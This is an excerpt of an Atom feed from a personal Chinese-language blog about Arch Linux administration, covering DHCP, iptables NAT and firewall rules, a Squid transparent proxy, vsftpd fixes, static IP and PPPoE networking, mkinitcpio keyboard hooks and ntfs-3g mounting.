&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt;fixed-address&lt;/span&gt; &lt;span class="err"&gt;172.16.1.30&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;為了讓 dhcpd 只 listen 特定的 interface&lt;br /&gt;
在 &lt;code&gt;/etc/conf.d/dhcp&lt;/code&gt; 中 把 &lt;code&gt;DHCP4_ARGS="-q"&lt;/code&gt; 改成 &lt;code&gt;DHCP4_ARGS="-q enp0s19"&lt;/code&gt;&lt;br /&gt;
然後 &lt;code&gt;# systemctl start dhcpd4&lt;/code&gt; 應該就能成功當起 dhcp server 了  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;DHCP client (on www-q and mail-q)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Network_Configuration#Dynamic_IP_address"&gt;https://wiki.archlinux.org/index.php/Network_Configuration#Dynamic_IP_address&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一樣照著 arch wiki 作 預設應該就有裝 dhcpcd 了&lt;br /&gt;
&lt;code&gt;# dhcpcd enp0s18&lt;/code&gt;&lt;br /&gt;
這裡的 enp0s18 是內網網卡&lt;br /&gt;
然後 &lt;code&gt;# systemctl start dhcpcd@enp0s18&lt;/code&gt;&lt;br /&gt;
用 &lt;code&gt;$ lspci -k&lt;/code&gt; 察看跟網卡相關的 modules&lt;br /&gt;
結果如下  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;13.0&lt;/span&gt; &lt;span class="n"&gt;Ethernet&lt;/span&gt; &lt;span class="n"&gt;controller&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Realtek&lt;/span&gt; &lt;span class="n"&gt;Semiconductor&lt;/span&gt; &lt;span class="n"&gt;Co&lt;/span&gt;&lt;span class="o"&gt;.,&lt;/span&gt; &lt;span class="n"&gt;Ltd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;RTL&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;8139&lt;/span&gt;&lt;span class="sr"&gt;/8139C/&lt;/span&gt;&lt;span class="mi"&gt;8139&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rev&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="n"&gt;Subsystem&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Red&lt;/span&gt; &lt;span class="n"&gt;Hat&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Inc&lt;/span&gt; &lt;span class="n"&gt;Device&lt;/span&gt; &lt;span class="mi"&gt;1100&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="n"&gt;Kernel&lt;/span&gt; &lt;span class="n"&gt;driver&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;use&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;8139&lt;/span&gt;&lt;span class="n"&gt;cp&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;所以可以知道在 &lt;code&gt;/etc/modules-load/realtek.conf&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Note&lt;/h3&gt;
&lt;p&gt;這邊卡關了一下是因為 dv 也在 140.113.27 網段底下架了一台 dhcp Server&lt;br /&gt;
結果我的 client 一直拿到他的 server 發出來的 ip 而不是我自己架的&lt;br /&gt;
看了鳥哥的網頁&lt;br /&gt;
&lt;a href="http://linux.vbird.org/linux_server/0340dhcp.php#client_linux"&gt;http://linux.vbird.org/linux_server/0340dhcp.php#client_linux&lt;/a&gt;&lt;br /&gt;
裏面有提到在 client 端上的 /var/lib/dhclient/ 裏面有跟租約相關的檔案&lt;br /&gt;
可以用 vim 開啟直接改寫&lt;br /&gt;
&lt;code&gt;option dhcp-server-identifier 172.16.1.254&lt;/code&gt; 指定 dhcp Server&lt;br /&gt;
可是在 archlinux 底下無法直接這樣改寫，用vim開起來會是亂碼&lt;br /&gt;
後來是在 client 端的 &lt;code&gt;/etc/dhcpcd.conf&lt;/code&gt; 中加上 &lt;code&gt;static routers=172.16.1.254&lt;/code&gt; 解決  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;NAT &amp;amp; Firewall&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;In Linux we use iptables, while in FreeBSD we use PF  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://linux.vbird.org/linux_server/0250simple_firewall.php"&gt;http://linux.vbird.org/linux_server/0250simple_firewall.php&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Internet_Share"&gt;https://wiki.archlinux.org/index.php/Internet_Share&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Simple_Stateful_Firewall"&gt;https://wiki.archlinux.org/index.php/Simple_Stateful_Firewall&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Iptables"&gt;https://wiki.archlinux.org/index.php/Iptables&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Router"&gt;https://wiki.archlinux.org/index.php/Router&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.revsys.com/writings/quicktips/nat.html"&gt;http://www.revsys.com/writings/quicktips/nat.html&lt;/a&gt;&lt;br /&gt;
&lt;br /&gt;
參考了以上的連結之後，目前 iptables 的設定如下  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Generated by iptables-save v1.4.18 on Tue Apr  9 04:40:40 2013                
*mangle                                                                        
:PREROUTING ACCEPT [369:34165]                                                  
:INPUT ACCEPT [278:20862]                                                      
:FORWARD ACCEPT [91:13303]                                                      
:OUTPUT ACCEPT [153:20248]                                                      
:POSTROUTING ACCEPT [244:33551]                                                
COMMIT                                                                          
# Completed on Tue Apr  9 04:40:40 2013                                        
# Generated by iptables-save v1.4.18 on Tue Apr  9 04:40:40 2013                
*filter                                                                        
:INPUT ACCEPT [3:418]                                                          
:FORWARD ACCEPT [91:13303]                                                      
:OUTPUT ACCEPT [153:20248]                                                      
:BADHOST - [0:0]                                                                
-A INPUT -j BADHOST                                                            
-A BADHOST -s 140.113.101.10 -j DROP                                            
-A INPUT -i enp0s18 -p icmp -m icmp --icmp-type 8 -j DROP                      
-A INPUT -m state --state INVALID -j DROP                                      
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT                        
-A INPUT -i lo -j ACCEPT                                                        
-A INPUT -i enp0s18 -s 140.113.230.88 -j ACCEPT                                
-A FORWARD -m state --state INVALID -j DROP                                    
-A FORWARD -s 140.113.17.0/24 -d 172.16.1.30 -p tcp --dport 21 -j REJECT --reject-with tcp-reset  
-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT  
-A FORWARD -s 140.113.230.88 -d 172.16.1.30 -p tcp --dport 21:22 -j ACCEPT      
-A FORWARD -s 140.113.27.47 -d 172.16.1.30 -p tcp --dport 22 -j ACCEPT        
-A FORWARD -s 140.113.235.0/24 -d 172.16.1.30 -p tcp --dport 21 -j ACCEPT      
-A FORWARD -s 140.113.17.0/24 -d 172.16.1.30 -p tcp --dport 22 -j ACCEPT        
-A FORWARD -d 172.16.1.30 -p tcp --dport 21 -j DROP                            
-A FORWARD -d 172.16.1.30 -p tcp --dport 22 -j DROP                            
COMMIT                                                                          
# Completed on Tue Apr  9 04:40:40 2013                                        
# Generated by iptables-save v1.4.18 on Tue Apr  9 04:40:40 2013                
*nat                                                                            
:PREROUTING ACCEPT [2:426]                                                      
:INPUT ACCEPT [1:354]                                                          
:OUTPUT ACCEPT [0:0]                                                            
:POSTROUTING ACCEPT [1:60]                                                      
-A PREROUTING -i enp0s18 -p tcp --dport 21 -j DNAT --to-destination 172.16.1.30:21  
-A PREROUTING -i enp0s18 -p tcp --dport 222 -j DNAT --to-destination 172.16.1.30:22  
-A PREROUTING -s 172.16.1.0/24 -i enp0s19 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 3128  
-A POSTROUTING -s 172.16.1.0/24 -o enp0s18 -j MASQUERADE                        
COMMIT                                                                          
# Completed on Tue Apr  9 04:40:40 2013  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;140.113.230.88 是寢室的 ip&lt;br /&gt;
140.113.27.47 是社窩無網的ip&lt;br /&gt;
為了方便操作用  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Proxy&lt;/h2&gt;
&lt;h3&gt;ftp-proxy&lt;/h3&gt;
&lt;p&gt;好像在 iptables 就設定完了 根本不用像 FreeBSD 還要用 ftp-proxy&lt;br /&gt;
猜測是因為 &lt;code&gt;-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT&lt;/code&gt; 的緣故  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Squid"&gt;https://wiki.archlinux.org/index.php/Squid&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://linux.vbird.org/linux_server/0420squid.php"&gt;http://linux.vbird.org/linux_server/0420squid.php&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;transparent http proxy&lt;/h3&gt;
&lt;p&gt;在 &lt;code&gt;/etc/squid/squid.conf&lt;/code&gt; 中 &lt;code&gt;http_port&lt;/code&gt; 後面加上 &lt;code&gt;intercept&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;http_port 3128 intercept&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;鳥哥裏面是寫 &lt;code&gt;http_port 3128 transparent&lt;/code&gt;&lt;br /&gt;
在 &lt;a href="http://www.squid-cache.org/Doc/config/http_port/"&gt;http://www.squid-cache.org/Doc/config/http_port/&lt;/a&gt; 有寫到在 3.1 的版本以後&lt;br /&gt;
intercept - Rename of old 'transparent' option to indicate proper functionality.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;把 &lt;code&gt;cache_dir ufs /var/cache/squid 256 16 256&lt;/code&gt; 的註解取消&lt;br /&gt;
再加上 &lt;code&gt;cache_mem 8 MB&lt;/code&gt; (預設是 8 MB 可以自己改)  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;# squid -z&lt;/code&gt; (在 &lt;code&gt;/var/cache/squid/&lt;/code&gt; 建立資料夾)&lt;br /&gt;
&lt;code&gt;# squid -k check&lt;/code&gt; (檢查 &lt;code&gt;/etc/squid/squid.conf&lt;/code&gt; 有沒有問題)&lt;br /&gt;
&lt;code&gt;# systemctl start squid&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;之後在 iptables 的 nat table 中加上新的 rule,&lt;br /&gt;
把內網往外傳的 http request 轉到 squid 上&lt;br /&gt;
&lt;code&gt;-A PREROUTING -i enp0s19 -s 172.16.1.0/24 -p tcp --dport 80 -j REDIRECT --to-ports 3128&lt;/code&gt;&lt;br /&gt;
然後 reload iptables  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;vsftpd&lt;/h2&gt;
&lt;p&gt;遇到兩個錯誤  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;500 OOPS: priv_sock_get_cmd&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;解決方法  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://bbs.archlinux.org/viewtopic.php?id=147074"&gt;https://bbs.archlinux.org/viewtopic.php?id=147074&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;在 &lt;code&gt;/etc/vsftpd.conf&lt;/code&gt; 加上 &lt;code&gt;seccomp_sandbox=0&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;500 OOPS: vsftpd: refusing to run with writable root inside chroot()&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;解決方法  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ubuntu-tw.org/modules/newbb/viewtopic.php?post_id=236642"&gt;http://www.ubuntu-tw.org/modules/newbb/viewtopic.php?post_id=236642&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;chmod a-w $dir&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;該 root dir 不可有寫入的權限  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;感想&lt;/h2&gt;
&lt;p&gt;用 Arch Linux 蠻方便的&lt;br /&gt;
基本上就照著鳥哥和 Arch Wiki 的教學邊做邊學應該就差不多了&lt;br /&gt;
不過跟上課教的好像差蠻多的XD&lt;br /&gt;
教的是 FreeBSD, PF&lt;br /&gt;
結果我用 Linux, iptables&lt;br /&gt;
這樣期中考真的沒問題嗎w?  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="iptables"></category><category term="Firewall"></category><category term="DHCP"></category><category term="NAT"></category><category term="sysadmin"></category></entry><entry><title>Setup Static Ip Wired Network in Arch Linux</title><link href="https://blog.m157q.tw/posts/2013/02/25/setup-static-ip-wired-network-in-arch-linux/" rel="alternate"></link><published>2015-10-27T22:11:00+08:00</published><updated>2015-10-27T22:11:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-02-25:posts/2013/02/25/setup-static-ip-wired-network-in-arch-linux/</id><summary type="html">&lt;p&gt;因為之前安裝 Arch 的時候是用 wireless network 只要用就好  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo wifi-menu  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;或者是  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo wicd-gtk  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;Arch 預設沒有裝 wicd,&lt;br /&gt;
要使用的話請先用 &lt;code&gt;$ sudo pacman -S wicd-gtk&lt;/code&gt; 安裝 wicd 後就可以解決&lt;br /&gt;
在執行 wicd-gtk 之前 要先  &lt;code&gt;$ sudo wicd&lt;/code&gt;  把 wicd run 起來&lt;br /&gt;
不然會有錯誤訊息顯示  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以上是無線網路的部份 設定很簡單 有線網路的設定就比較麻煩一點  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;寒假在家裡上網用 ADSL&lt;br /&gt;
照著上一篇的 &lt;a href="/posts/2013/02/20/setup-pppoe-wired-network-in-arch-linux/"&gt;[Arch Linux] Set up wired network with pppoe-setup&lt;/a&gt; 就可以完成  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;開學後回到宿舍 得設定 static ip&lt;br /&gt;
一開始想說用 &lt;code&gt;wicd-gtk&lt;/code&gt; 新增一個 wired connection&lt;br /&gt;
然後把該設定的 property 設定完應該就能用了&lt;br /&gt;
結果就是連不上 然後發現  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://wiki.archlinux.org/index.php/Beginners%27_guide#Wired"&gt;Beginners' guide - ArchWiki&lt;/a&gt; 其實有講&lt;br /&gt;
不過我這裡的方法不太一樣就是 但基本上大同小異  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;以下是我的作法：  &lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;/etc/network.d/&lt;/code&gt; 底下建立設定檔  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ vim /etc/network.d/ethernet-dorm  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其內容如下 #為註解部分  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;CONNECTION=&amp;#39;ethernet&amp;#39;  
DESCRIPTION=&amp;#39;A basic static ethernet connection using iproute&amp;#39;  
INTERFACE=&amp;#39;enp2s0&amp;#39;  
IP=&amp;#39;static&amp;#39;  
ADDR=&amp;#39;140.113.69.103&amp;#39;  
GATEWAY=&amp;#39;140.113.69.254&amp;#39;  
DNS=(&amp;#39;8.8.8.8&amp;#39;, &amp;#39;8.8.4.4&amp;#39;, &amp;#39;140.113.1.1&amp;#39;, &amp;#39;140.113.6.2&amp;#39;)  

## For IPv6 autoconfiguration  
#IP6=stateless  

## For IPv6 static address configuration  
#IP6=&amp;#39;static&amp;#39;  
#ADDR6=(&amp;#39;1234:5678:9abc:def::1/64&amp;#39; &amp;#39;1234:3456::123/96&amp;#39;)  
#ROUTES6=(&amp;#39;abcd::1234&amp;#39;)  
#GATEWAY6=&amp;#39;1234:0:123::abcd&amp;#39;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用 &lt;code&gt;netcfg&lt;/code&gt; 這個指令  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo netcfg -u ethernet-dorm  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這樣應該就可以啟動該網路連線了，如果設定都 OK 的話應該就會正常運作。  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="sysadmin"></category><category term="Network"></category></entry><entry><title>Setup PPPoE Wired Network in Arch Linux</title><link href="https://blog.m157q.tw/posts/2013/02/20/setup-pppoe-wired-network-in-arch-linux/" rel="alternate"></link><published>2015-10-27T22:03:00+08:00</published><updated>2015-10-27T22:03:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-02-20:posts/2013/02/20/setup-pppoe-wired-network-in-arch-linux/</id><summary type="html">&lt;p&gt;照著 &lt;a href="https://wiki.archlinux.org/index.php/Direct_modem_connection"&gt;Direct modem connection - ArchWiki&lt;/a&gt; 這部份設定  &lt;/p&gt;
&lt;p&gt;下 &lt;code&gt;# pppoe-setup&lt;/code&gt; 的時候 跟我說 &lt;code&gt;command not found&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;查了一下才知道要先裝上 &lt;code&gt;rp-pppoe&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;所以要設定之前記得先下  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ sudo pacman -S rp-pppoe&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;安裝完後再照著上面 ArchWiki 的步驟設定應該就行了  &lt;/p&gt;
&lt;p&gt;之前不知道要安裝 &lt;code&gt;rp-pppoe&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;結果跑去 ArchWiki 搜尋 &lt;code&gt;pppoe&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;跑出 &lt;a href="https://wiki.archlinux.org/index.php/pppd"&gt;pppd - ArchWiki&lt;/a&gt; 給我  &lt;/p&gt;
&lt;p&gt;照著做還是弄不起來 後來才知道要安裝 &lt;code&gt;rp-pppoe&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;所以就是先 &lt;code&gt;$ sudo pacman -S rp-pppoe&lt;/code&gt; 後  &lt;/p&gt;
&lt;p&gt;再 &lt;code&gt;$ sudo pppoe-setup&lt;/code&gt; 就行了  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="Network"></category><category term="rp-pppoe"></category><category term="PPPoE"></category></entry><entry><title>Arch Linux - USB鍵盤和USB滑鼠插上去卻無法使用的解法</title><link href="https://blog.m157q.tw/posts/2013/02/17/solution-for-usb-keyboard-and-mouse-not-working-in-arch-linux/" rel="alternate"></link><published>2015-10-27T22:14:00+08:00</published><updated>2015-10-27T22:14:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-02-17:posts/2013/02/17/solution-for-usb-keyboard-and-mouse-not-working-in-arch-linux/</id><summary type="html">&lt;p&gt;前幾天剛灌好 &lt;code&gt;Arch Linux x86_64&lt;/code&gt;&lt;br /&gt;
接上 USB外接滑鼠和鍵盤 竟然沒辦法使用 (我想用我的青軸鍵盤啊Q_Q)&lt;br /&gt;
光學滑鼠的紅色燈有亮 但不能動 鍵盤也沒反應&lt;br /&gt;
查了論壇上幾篇文章 有和我狀況類似的 可是照著弄還是不會動&lt;br /&gt;
大概都是問說有沒有在 &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt; 裏面的 HOOKS 加入 usbinput  &lt;/p&gt;
&lt;p&gt;但參考了 &lt;a href="https://wiki.archlinux.org/index.php/Mkinitcpio#HOOKS"&gt;mkinitcpio - ArchWiki&lt;/a&gt; 後  &lt;/p&gt;
&lt;p&gt;裏面有著這行敘述  &lt;/p&gt;
&lt;p&gt;&lt;img alt="mkinitcpio" src="/files/solution-for-usb-keyboard-and-mouse-not-working-in-arch-linux/mkinitcpio.png" /&gt;  &lt;/p&gt;
&lt;p&gt;意思是 &lt;code&gt;usbinput&lt;/code&gt; 在 &lt;code&gt;mkinitcpio 0.13.0&lt;/code&gt; 已經被合併到 keyboard 裏面了&lt;br /&gt;
所以只要在 &lt;code&gt;/etc/mkinitcpio.conf&lt;/code&gt; 裏面的 &lt;code&gt;HOOKS&lt;/code&gt; 加入 &lt;code&gt;keyboard&lt;/code&gt;&lt;br /&gt;
(HOOKS裏面應該已經有其他東西了)&lt;br /&gt;
加入後，以我的 &lt;code&gt;mkinitcpio.conf&lt;/code&gt; 為例，會長的像這樣  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;HOOKS="base udev autodetect modconf block filesystems keyboard fsck keymap"&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;修改完後 一定要記得下  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo mkinitcpio -p linux  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(我就是忘記下這行指令才卡很久都沒外接滑鼠和鍵盤可以用=  =")  &lt;/p&gt;
&lt;p&gt;等他跑完 再把USB滑鼠和USB鍵盤插上去試試  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="USB"></category><category term="mkinitcpio"></category></entry><entry><title>用 ntfs-3g 自動 mount Windows 裡的 D 槽</title><link href="https://blog.m157q.tw/posts/2013/02/17/automatically-mount-windows-partition-by-using-ntfs-3g/" rel="alternate"></link><published>2015-10-28T15:14:00+08:00</published><updated>2015-10-28T15:14:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-02-17:posts/2013/02/17/automatically-mount-windows-partition-by-using-ntfs-3g/</id><summary type="html">&lt;p&gt;想在 Arch Linux 上 mount windows 裏面的 D 槽&lt;br /&gt;
因為之前用 Ubuntu 的時候 就一直拿 D 槽當作是共用的存檔地方&lt;br /&gt;
所以灌其他作業系統的時候也不太需要做啥備份  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;fstab&lt;/h2&gt;
&lt;p&gt;如果要讓 Linux 在開機的時候自動 mount D槽  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ sudoedit /etc/fstab&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;必須在 &lt;code&gt;/etc/fstab&lt;/code&gt; 中下寫類似這樣的 rule  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# /dev/sda5 (win_D)  
    UUID=01CC0B74E1BC55F0 /win_D ntfs-3g defaults,umask=000  0  2  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;UUID&lt;/h2&gt;
&lt;p&gt;之後使用 &lt;code&gt;$ lsblk -f&lt;/code&gt; 這個指令去察看要 &lt;code&gt;mount&lt;/code&gt; 的硬碟的 UUID&lt;br /&gt;
然後把該 UUID 填寫在 &lt;code&gt;UUID=&lt;/code&gt; 的後面&lt;br /&gt;
不知道什麼是 UUID 的可參考 &lt;a href="https://zh.wikipedia.org/zh-tw/%E9%80%9A%E7%94%A8%E5%94%AF%E4%B8%80%E8%AF%86%E5%88%AB%E7%A0%81"&gt;通用唯一識別碼 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;/win_D&lt;/code&gt; 是你要把 D 槽 mount 在哪個目錄底下 可以自行修改  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;ntfs-3g&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;ntfs-3g&lt;/code&gt; 不知道這是什麼的請見 &lt;a href="https://zh.wikipedia.org/zh-tw/NTFS-3G"&gt;NTFS-3G - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;這裡如果用 &lt;code&gt;ntfs&lt;/code&gt; 的話會造成無法寫入和修改權限&lt;br /&gt;
所以要用 &lt;code&gt;ntfs-3g&lt;/code&gt;&lt;br /&gt;
預設應該是沒安裝的&lt;br /&gt;
在 Arch Linux 請先  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ sudo pacman -S ntfs-3g&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;defaults,umask=000 0 2&lt;/code&gt; 後面這 3 個部份  &lt;/p&gt;
&lt;p&gt;請參考  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Fstab"&gt;fstab - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://linux.vbird.org/linux_basic/0230filesystem.php#fstab"&gt;鳥哥的 Linux 私房菜 -- 第七章、Linux 磁碟與檔案系統管理&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;需要其他不同的設定的話可以參考後 自行修改 &lt;code&gt;options&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;code&gt;umask&lt;/code&gt; 用 &lt;code&gt;000&lt;/code&gt; 是因為我這台是個人使用的筆電&lt;br /&gt;
為了方便存取 D 槽才這樣設定&lt;br /&gt;
因為 &lt;code&gt;mount&lt;/code&gt; 起來的 &lt;code&gt;owner&lt;/code&gt; 和 &lt;code&gt;group&lt;/code&gt; 都會是 root&lt;br /&gt;
反正只有我一個人用&lt;br /&gt;
設 &lt;code&gt;777&lt;/code&gt; 會比較方便 但相對安全性就變低了Orz  &lt;/p&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="fstab"></category><category term="UUID"></category><category term="NTFS"></category><category term="ntfs-3g"></category></entry><entry><title>Font Config in Arch Linux</title><link href="https://blog.m157q.tw/posts/2013/02/16/font-config-in-arch-linux/" rel="alternate"></link><published>2015-10-28T15:27:00+08:00</published><updated>2015-10-28T15:27:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-02-16:posts/2013/02/16/font-config-in-arch-linux/</id><summary type="html">&lt;p&gt;漂亮的字型對一個好的使用環境來講真的非常重要  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;中文字型我慣用 &lt;code&gt;LiHei Pro&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;英數字型我慣用 &lt;code&gt;Monaco&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
